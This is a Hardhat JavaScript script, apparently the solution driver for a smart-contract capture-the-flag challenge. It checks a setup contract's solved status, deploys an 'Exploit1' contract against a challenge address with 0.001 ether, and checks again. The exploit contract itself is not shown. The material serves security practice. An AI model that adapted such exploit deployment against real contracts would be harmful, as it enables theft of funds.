// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { parseEther } = require("ethers/lib/utils");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  //set addresses for current challenge
  const setupAddress = "0x46C9489797c5647F850dD3A5bcB13C240bcd383A";
  const challenge = "0xD2034a50C5Adc8A190D4f8c8EE18643Ab8A0ff05";

  //attach setup
  const setupContract = await hre.ethers.getContractAt("SetupBackup", setupAddress);
  
  //verify unsolved
  console.log("Solved before ?: ", await setupContract.isSolved());

  // deploy exploit contract
  const Exploit = await hre.ethers.getContractFactory("Exploit1");
  const exploit = await Exploit.deploy(challenge, { value: parseEther("0.001") });
  await exploit.deployed();

  //verify solved
  console.log("Solved after?: ", await setupContract.isSolved());
  

  console.log("Exploit deployed to:", exploit.address);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
